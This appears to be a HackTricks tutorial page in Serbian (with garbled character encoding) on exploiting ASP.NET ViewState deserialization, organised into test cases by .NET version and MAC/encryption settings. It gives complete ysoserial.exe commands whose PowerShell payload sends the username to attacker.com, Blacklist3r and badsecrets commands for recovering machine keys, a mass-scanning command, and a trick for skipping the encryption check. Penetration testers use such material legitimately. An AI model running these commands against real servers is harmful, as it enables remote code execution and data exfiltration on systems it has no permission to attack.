# IskoriÅ¡Ä‡avanje \_\_VIEWSTATE parametra bez poznavanja tajni

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Ako vas zanima **hakerska karijera** i hakovanje nehakabilnog - **mi zapoÅ¡ljavamo!** (_potrebno je teÄno poznavanje poljskog jezika, pisano i govorno_).

{% embed url="https://www.stmcyber.com/careers" %}

## Å ta je ViewState

**ViewState** sluÅ¾i kao podrazumevani mehanizam u ASP.NET-u za odrÅ¾avanje podataka stranice i kontrola izmeÄ‘u web stranica. Tokom renderovanja HTML-a stranice, trenutno stanje stranice i vrednosti koje treba saÄuvati tokom postback-a se serijalizuju u base64 enkodirane stringove. Ovi stringovi se zatim smeÅ¡taju u skrivene ViewState polja.

Informacije o ViewState-u mogu se karakterisati sledeÄ‡im svojstvima ili njihovim kombinacijama:

- **Base64**:
- Ovaj format se koristi kada su atributi `EnableViewStateMac` i `ViewStateEncryptionMode` postavljeni na false.

- **Base64 + MAC (Message Authentication Code) omoguÄ‡en**:
- Aktivacija MAC-a se postiÅ¾e postavljanjem atributa `EnableViewStateMac` na true. Ovo obezbeÄ‘uje proveru integriteta ViewState podataka.

- **Base64 + Enkriptovan**:
- Enkripcija se primenjuje kada je atribut `ViewStateEncryptionMode` postavljen na true, Äime se obezbeÄ‘uje poverljivost ViewState podataka.

## Test sluÄajevi

Slika je tabela koja detaljno opisuje razliÄite konfiguracije ViewState-a u ASP.NET-u na osnovu verzije .NET framework-a. Evo saÅ¾etka sadrÅ¾aja:

1. Za **bilo koju verziju .NET-a**, kada su i MAC i enkripcija onemoguÄ‡eni, MachineKey nije potreban i stoga ne postoji odgovarajuÄ‡a metoda za njegovo identifikovanje.

2. Za **verzije ispod 4.5**, ako je MAC omoguÄ‡en, ali enkripcija nije, potreban je MachineKey. Metoda za identifikaciju MachineKey-a se naziva "Blacklist3r".

3. Za **verzije ispod 4.5**, bez obzira da li je MAC omoguÄ‡en ili onemoguÄ‡en, ako je enkripcija omoguÄ‡ena, potreban je MachineKey. Identifikacija MachineKey-a je zadatak za "Blacklist3r - Future Development".

4. Za **verzije 4.5 i novije**, sve kombinacije MAC-a i enkripcije (bilo da su oba taÄna ili jedan taÄan a drugi netaÄan) zahtevaju MachineKey. MachineKey se moÅ¾e identifikovati pomoÄ‡u "Blacklist3r".

### Test sluÄaj: 1 â€“ EnableViewStateMac=false i viewStateEncryptionMode=false

TakoÄ‘e je moguÄ‡e potpuno onemoguÄ‡iti ViewStateMAC postavljanjem registarskog kljuÄa `AspNetEnforceViewStateMac` na nulu u:
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\v{VersionHere}
```
**Identifikacija ViewState atributa**

MoÅ¾ete pokuÅ¡ati identifikovati da li je ViewState zaÅ¡tiÄ‡en MAC-om snimajuÄ‡i zahtev koji sadrÅ¾i ovaj parametar pomoÄ‡u BurpSuite alata. Ako se Mac ne koristi za zaÅ¡titu parametra, moÅ¾ete ga iskoristiti koristeÄ‡i [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)
```
ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName"
```
### Test sluÄaj 1.5 - Kao Test sluÄaj 1, ali ViewState kolaÄiÄ‡ nije poslat od strane servera

Razvojni programeri mogu ukloniti ViewState da postane deo HTTP zahteva (korisnik neÄ‡e primiti ovaj kolaÄiÄ‡).\
MoÅ¾e se pretpostaviti da ako ViewState nije prisutan, njihova implementacija je sigurna od potencijalnih ranjivosti koje proizlaze iz ViewState deserijalizacije.\
MeÄ‘utim, to nije sluÄaj. Ako dodamo ViewState parametar u telo zahteva i poÅ¡aljemo naÅ¡ serijski payload kreiran pomoÄ‡u ysoserial, i dalje Ä‡emo moÄ‡i postiÄ‡i izvrÅ¡avanje koda kao Å¡to je prikazano u SluÄaju 1.


### Test sluÄaj: 2 - .Net < 4.5 i EnableViewStateMac=true & ViewStateEncryptionMode=false

Da bismo omoguÄ‡ili ViewState MAC za odreÄ‘enu stranicu, moramo napraviti sledeÄ‡e promene na odreÄ‘enom aspx fajlu:
```bash
<%@ Page Language="C#" AutoEventWireup="true" CodeFile="hello.aspx.cs" Inherits="hello" enableViewStateMac="True"%>
```
TakoÄ‘e moÅ¾emo to uraditi za **celokupnu** aplikaciju postavljanjem u **web.config** fajlu kako je prikazano ispod:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
<system.web>
<customErrors mode="Off" />
<machineKey validation="SHA1" validationKey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45" />
<pages enableViewStateMac="true" />
</system.web>
</configuration>
```
Kako je ovaj parametar zaÅ¡tiÄ‡en MAC-om, da bismo uspeÅ¡no izvrÅ¡ili napad, prvo moramo pronaÄ‡i koriÅ¡Ä‡eni kljuÄ.

MoÅ¾ete pokuÅ¡ati koristiti [**Blacklist3r(AspDotNetWrapper.exe)** ](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) da pronaÄ‘ete koriÅ¡Ä‡eni kljuÄ.
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --decrypt --purpose=viewstate --modifier=6811C9FF --macdecode --TargetPagePath "/Savings-and-Investments/Application/ContactDetails.aspx" -f out.txt --IISDirPath="/"

--encrypteddata : __VIEWSTATE parameter value of the target application
--modifier : __VIWESTATEGENERATOR parameter value
```
[**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets) je joÅ¡ jedan alat koji moÅ¾e identifikovati poznate machineKeys. Napisan je u Pythonu, tako da, za razliku od Blacklist3r-a, nema zavisnosti od Windows-a. Za .NET viewstate-ove, postoji "python blacklist3r" alat, koji je najbrÅ¾i naÄin za njegovo koriÅ¡Ä‡enje.

MoÅ¾e se obezbediti ili direktno sa viewstate-om i generatorom:
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --viewstate /wEPDwUJODExMDE5NzY5ZGQMKS6jehX5HkJgXxrPh09vumNTKQ== --generator EDD8C9AE
```
![https://user-images.githubusercontent.com/24899338/227034640-662b6aad-f8b9-49e4-9a6b-62a5f6ae2d60.png](https://user-images.githubusercontent.com/24899338/227034640-662b6aad-f8b9-49e4-9a6b-62a5f6ae2d60.png)

Ili, moÅ¾e se direktno povezati sa ciljnim URL-om i pokuÅ¡ati izdvojiti viewstate iz HTML-a:
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --url http://vulnerablesite/vulnerablepage.aspx
```
![https://user-images.githubusercontent.com/24899338/227034654-e8ad9648-6c0e-47cb-a873-bf97623a0089.png](https://user-images.githubusercontent.com/24899338/227034654-e8ad9648-6c0e-47cb-a873-bf97623a0089.png)

Da biste pretraÅ¾ili ranjive viewstate-ove u velikom obimu, u kombinaciji sa prebrojavanjem poddomena, moÅ¾e se koristiti modul `badsecrets` [**BBOT**](exploiting-\_\_viewstate-parameter.md):
```
bbot -f subdomain-enum -m badsecrets -t evil.corp
```
![https://user-images.githubusercontent.com/24899338/227028780-950d067a-4a01-481f-8e11-41fabed1943a.png](https://user-images.githubusercontent.com/24899338/227028780-950d067a-4a01-481f-8e11-41fabed1943a.png)

Ako imate sreÄ‡e i kljuÄ je pronaÄ‘en, moÅ¾ete nastaviti sa napadom koristeÄ‡i [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)**:**
```
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --generator=CA0B0334 --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"

--generator = {__VIWESTATEGENERATOR parameter value}
```
U sluÄajevima kada server **ne Å¡alje** parametar `_VIEWSTATEGENERATOR`, **nije potrebno** da **navedete** parametar `--generator`, **ali ove** su potrebne:
```bash
--apppath="/" --path="/hello.aspx"
```
### Test sluÄaj: 3 - .Net < 4.5 i EnableViewStateMac=true/false i ViewStateEncryptionMode=true

U ovom sluÄaju nije poznato da li je parametar zaÅ¡tiÄ‡en sa MAC-om. Tada je vrednost verovatno Å¡ifrovana i **potrebno je imati Machine Key da biste Å¡ifrovali svoj payload** kako biste iskoristili ranjivost.

**U ovom sluÄaju** [**Blacklist3r**](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) **modul je u razvoju...**

Pre .NET 4.5, ASP.NET moÅ¾e **prihvatiti** neÅ¡ifrovan parametar \_`__VIEWSTATE`\_ od korisnika **Äak i ako je** `ViewStateEncryptionMode` **postavljen na** _**Always**_. ASP.NET **samo proverava** prisustvo parametra **`__VIEWSTATEENCRYPTED`** u zahtevu. **Ako se ovaj parametar ukloni i poÅ¡alje neÅ¡ifrovani payload, i dalje Ä‡e biti obraÄ‘en.**

Stoga, ako napadaÄi pronaÄ‘u naÄin da dobiju Machine Key putem druge ranjivosti poput pretraÅ¾ivanja fajlova, [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net) komanda koriÅ¡Ä‡ena u **SluÄaju 2**, moÅ¾e se koristiti za izvrÅ¡avanje RCE-a koriÅ¡Ä‡enjem ranjivosti deserializacije ViewState-a.

* Uklonite parametar `__VIEWSTATEENCRYPTED` iz zahteva kako biste iskoristili ranjivost deserializacije ViewState-a, inaÄe Ä‡e se vratiti greÅ¡ka validacije Viewstate MAC-a i iskoriÅ¡Ä‡avanje Ä‡e propasti.

### Test sluÄaj: 4 - .Net >= 4.5 i EnableViewStateMac=true/false i ViewStateEncryptionMode=true/false osim ako su oba atributa postavljena na false

MoÅ¾emo prisiliti koriÅ¡Ä‡enje ASP.NET okvira navoÄ‘enjem sledeÄ‡eg parametra unutar web.config datoteke kako je prikazano ispod.
```xml
<httpRuntime targetFramework="4.5" />
```
Alternativno, ovo se moÅ¾e postiÄ‡i navoÄ‘enjem sledeÄ‡e opcije unutar parametra `machineKey` u web.config datoteci.
```bash
compatibilityMode="Framework45"
```
Kao i prethodno, **vrednost je Å¡ifrovana**. Zatim, da bi poslao **validan payload, napadaÄu je potreban kljuÄ**.

MoÅ¾ete pokuÅ¡ati koristiti [**Blacklist3r(AspDotNetWrapper.exe)** ](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) da pronaÄ‘ete koriÅ¡Ä‡eni kljuÄ:
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata bcZW2sn9CbYxU47LwhBs1fyLvTQu6BktfcwTicOfagaKXho90yGLlA0HrdGOH6x/SUsjRGY0CCpvgM2uR3ba1s6humGhHFyr/gz+EP0fbrlBEAFOrq5S8vMknE/ZQ/8NNyWLwg== --decrypt --purpose=viewstate  --valalgo=sha1 --decalgo=aes --IISDirPath "/" --TargetPagePath "/Content/default.aspx"

--encrypteddata = {__VIEWSTATE parameter value}
--IISDirPath = {Directory path of website in IIS}
--TargetPagePath = {Target page path in application}
```
Za detaljniji opis IISDirPath i TargetPagePath [pogledajte ovde](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)

Ili, sa [**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets) (sa vrednoÅ¡Ä‡u generatora):
```bash
cd badsecrets
python examples/blacklist3r.py --viewstate JLFYOOegbdXmPjQou22oT2IxUwCAzSA9EAxD6+305e/4MQG7G1v5GI3wL7D94W2OGpVGrI2LCqEwDoS/8JkE0rR4ak0= --generator B2774415
```
![https://user-images.githubusercontent.com/24899338/227043316-13f0488f-5326-46cc-9604-404b908ebd7b.png](https://user-images.githubusercontent.com/24899338/227043316-13f0488f-5326-46cc-9604-404b908ebd7b.png)

Jednom kada se identifikuje vaÅ¾eÄ‡i Machine kljuÄ, **sledeÄ‡i korak je generisanje serijskog payload-a koristeÄ‡i** [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)
```
ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --path="/content/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="F6722806843145965513817CEBDECBB1F94808E4A6C0B2F2"  --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"
```
Ako imate vrednost `__VIEWSTATEGENERATOR`, moÅ¾ete pokuÅ¡ati da **koristite** parametar `--generator` sa tom vrednoÅ¡Ä‡u i **izostavite** parametre `--path` i `--apppath`

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/4.2.png)

Uspesno iskoriÅ¡Ä‡avanje ranjivosti ViewState deserijalizacije Ä‡e dovesti do zahteva ka serveru pod kontrolom napadaÄa, koji ukljuÄuje korisniÄko ime. Ovaj tip napada je prikazan u primeru koncepta (PoC) koji se moÅ¾e pronaÄ‡i u resursu pod nazivom "IskoriÅ¡Ä‡avanje ViewState deserijalizacije koriÅ¡Ä‡enjem Blacklist3r i YsoSerial.NET". Za dalje detalje o tome kako proces iskoriÅ¡Ä‡avanja funkcioniÅ¡e i kako koristiti alate poput Blacklist3r za identifikaciju MachineKey, moÅ¾ete pregledati pruÅ¾eni [PoC uspeÅ¡nog iskoriÅ¡Ä‡avanja](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/#PoC).


### Test sluÄaj 6 - ViewStateUserKeys se koristi

Svojstvo **ViewStateUserKey** se moÅ¾e koristiti za **odbranu** od **CSRF napada**. Ako je takav kljuÄ definisan u aplikaciji i pokuÅ¡amo da generiÅ¡emo **ViewState** payload sa metodama koje smo do sada diskutovali, **payload neÄ‡e biti obraÄ‘en od strane aplikacije**.\
Potrebno je koristiti joÅ¡ jedan parametar kako biste pravilno kreirali payload:
```bash
--viewstateuserkey="randomstringdefinedintheserver"
```
### Rezultat uspeÅ¡ne eksploatacije <a href="#poc" id="poc"></a>

Za sve test primere, ako ViewState YSoSerial.Net payload **uspeÅ¡no** funkcioniÅ¡e, server Ä‡e odgovoriti sa "500 Internal server error" i sadrÅ¾ajem odgovora "The state information is invalid for this page and might be corrupted", a mi dobijamo OOB zahtev.

Proverite [dalje informacije ovde]([**https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/**](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/))

## Reference

* [**https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/**](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/)
* [**https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817**](https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817)\\
* [**https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/**](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)
* [**https://blog.blacklanternsecurity.com/p/introducing-badsecrets**](https://blog.blacklanternsecurity.com/p/introducing-badsecrets)

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Ako vas zanima **hakerska karijera** i hakovanje nehakabilnog - **mi zapoÅ¡ljavamo!** (_potrebno je teÄno poznavanje poljskog jezika, pisano i govorno_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju oglaÅ¡enu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
